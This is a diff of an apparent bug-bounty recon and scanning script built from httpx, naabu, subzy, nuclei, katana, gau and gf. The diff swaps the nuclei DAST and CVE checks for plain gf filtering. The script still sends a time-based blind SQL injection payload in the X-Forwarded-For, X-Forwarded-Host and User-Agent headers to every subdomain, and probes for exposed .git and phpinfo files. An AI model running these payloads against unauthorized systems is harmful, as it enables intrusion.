@@ -43,39 +43,37 @@ cat Subdomains/subdomains.txt | httpx -silent -path "/server-status" -mc 200 -ti
 cat Subdomains/subdomains.txt | httpx -silent -path "/phpinfo.php" -mc 200 -title > Subdomains/httpx-phpinfo.txt
 cat Subdomains/subdomains.txt | httpx -silent -path "/.DS_Store" -mc 200 -title > Subdomains/httpx-DS_store.txt
 cat Subdomains/subdomains.txt | httpx -silent -path "/.git" -mc 200 -title > Subdomains/httpx-git.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running Httpx...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -sc -title -cl --tech-detect >> Subdomains/httpx-details.txt
 echo -e "${CYAN}Complete${RESET}"
 
 echo -e "${GREEN}Running Naabu...${RESET}"
-cat Subdomains/subdomains.txt | naabu -v --passive -silent > Subdomains/ports.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+cat Subdomains/subdomains.txt | naabu --passive -silent > Subdomains/ports.txt
+
 
 echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
 subzy run --targets Subdomains/subdomains.txt >> Subdomains/subzy.txt
-echo -e "${CYAN}Task Completed!${RESET}"
 
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-For.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-Host:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-Host.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
 cat Subdomains/subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-User-Agent.txt
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Creating nuclei directory...${RESET}"
 mkdir -p Subdomains/nuclei
-echo -e "${CYAN}Task Completed!${RESET}"
+
 
 echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
 cat Subdomains/subdomains.txt | nuclei -silent -t $HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
-echo -e "${CYAN}Task Completed!${RESET}"
 
 for year in {2000..2024}; do
     echo -e "${GREEN}Running Nuclei template for year $year...${RESET}"
@@ -88,19 +86,19 @@ mkdir -p urls
 
 echo -e "${GREEN}Running Katana${RESET}"
 echo "${TARGET_DOMAIN}" | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault > urls/katana.txt
-echo -e "${GREEN}Task finished${RESET}"
+
 
 echo -e "${GREEN}Running GAU${RESET}"
 echo "${TARGET_DOMAIN}" | gau --subs > urls/gau.txt
-echo -e "${GREEN}Task finished${RESET}"
+
 
 echo -e "${GREEN}Running Waybackurls...${RESET}"
 waybackurls "${TARGET_DOMAIN}" > urls/waybackurls.txt
-echo -e "${GREEN}Task finished${RESET}"
+
 
 echo -e "${GREEN}Combining all URLs${RESET}"
 cat urls/katana.txt urls/gau.txt urls/waybackurls.txt > urls/final-clean.txt
-echo -e "${GREEN}Task Completed${RESET}"
+
 
 echo -e "${GREEN}Checking all js files and running linkfinder...${RESET}"
 mkdir -p js-files
@@ -118,7 +116,7 @@ cat urls/final-clean.txt | grep "\.js$" | while read -r url; do
         } >> js-files/endpoints.txt
     fi
 done
-echo -e "${GREEN}Task Completed${RESET}"
+
 
 
 echo -e "${GREEN}Checking for possible XSS vulnerabilities...${RESET}"
@@ -129,34 +127,21 @@ while read -r host; do
     fi
 done
 
-echo -e "${GREEN}Testing for SQLi, Open-Redirect, SSRF, RCE, LFI, SSTI, CRLF using Nuclei Dast${RESET}"
+echo -e "${GREEN}Running GF${RESET}"
 
-cat urls/final-clean.txt | gf sqli | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/sqli/* | tee >(grep . > urls/sqli.txt)
-cat urls/final-clean.txt | gf redirect | egrep -iv "wp-" | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/redirect/* | tee >(grep . > urls/open-redirect.txt)
-cat urls/final-clean.txt | gf ssrf | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/ssrf/* | tee >(grep . > urls/ssrf.txt)
-cat urls/final-clean.txt | gf rce | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/rce/* | tee >(grep . > urls/rce.txt)
-cat urls/final-clean.txt | gf lfi | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/lfi/* | tee >(grep . > urls/lfi.txt)
-cat urls/final-clean.txt | gf interestingEXT | tee >(grep . > urls/interesting-extentions.txt)
-cat urls/final-clean.txt | gf interestingparams | tee >(grep . > urls/interesting-params.txt)
-cat urls/final-clean.txt | gf debug_logic | tee >(grep . > urls/debug-logic.txt)
-cat urls/final-clean.txt | gf img-traversal | tee >(grep . > urls/img-traversal.txt)
-cat urls/final-clean.txt | gf ssti | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/ssti/* | tee >(grep . > urls/ssti.txt)
-cat urls/final-clean.txt | nuclei -silent -t $HOME/nuclei-templates/dast/vulnerabilities/crlf/* | tee >(grep . > urls/crlf.txt)
+cat urls/final-clean.txt | gf xss | tee >(grep . > urls/xss.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf sqli | tee >(grep . > urls/sqli.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf redirect | egrep -iv "wp-" | tee >(grep . > urls/open-redirect.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf ssrf | tee >(grep . > urls/ssrf.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf rce | tee >(grep . > urls/rce.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf lfi | tee >(grep . > urls/lfi.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf interestingEXT | tee >(grep . > urls/interesting-extentions.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf interestingparams | tee >(grep . > urls/interesting-params.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf debug_logic | tee >(grep . > urls/debug-logic.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf img-traversal | tee >(grep . > urls/img-traversal.txt) >/dev/null 2>&1
+cat urls/final-clean.txt | gf ssti | tee >(grep . > urls/ssti.txt) >/dev/null 2>&1
 
-echo -e "${GREEN}Checking for CVE-2018-19518 using Nuclei Dast${RESET}"
-cat urls/final-clean.txt | nuclei -silent -t $HOME/nuclei-templates/dast/cves/2018/CVE-2018-19518.yaml | tee >(grep . > urls/CVE-2018-19518.txt)
 
-echo -e "${GREEN}Checking for CVE-2021-45046 using Nuclei Dast${RESET}"
-cat urls/final-clean.txt | nuclei -silent -t $HOME/nuclei-templates/dast/cves/2021/CVE-2021-45046.yaml | tee >(grep . > urls/CVE-2021-45046.txt)
-
-echo -e "${GREEN}Checking for CVE-2022-34265 using Nuclei Dast${RESET}"
-cat urls/final-clean.txt | nuclei -silent -t $HOME/nuclei-templates/dast/cves/2022/CVE-2022-34265.yaml | tee >(grep . > urls/CVE-2022-34265.txt)
-
-echo -e "${GREEN}Checking for CVE-2022-42889 using Nuclei Dast${RESET}"
-cat urls/final-clean.txt | nuclei -silent -t $HOME/nuclei-templates/dast/cves/2022/CVE-2022-42889.yaml | tee >(grep . > urls/CVE-2022-42889.txt)
-
-echo -e "${GREEN}Checking for spring4shell-CVE-2022-22965 using Nuclei Dast${RESET}"
-cat urls/final-clean.txt | nuclei -silent -t $HOME/nuclei-templates/dast/cves/2022/spring4shell-CVE-2022-22965.yaml | tee >(grep . > urls/spring4shell-CVE-2022-22965.txt)
 
 mkdir urls/nuclei
 for i in {2000..2024}; do
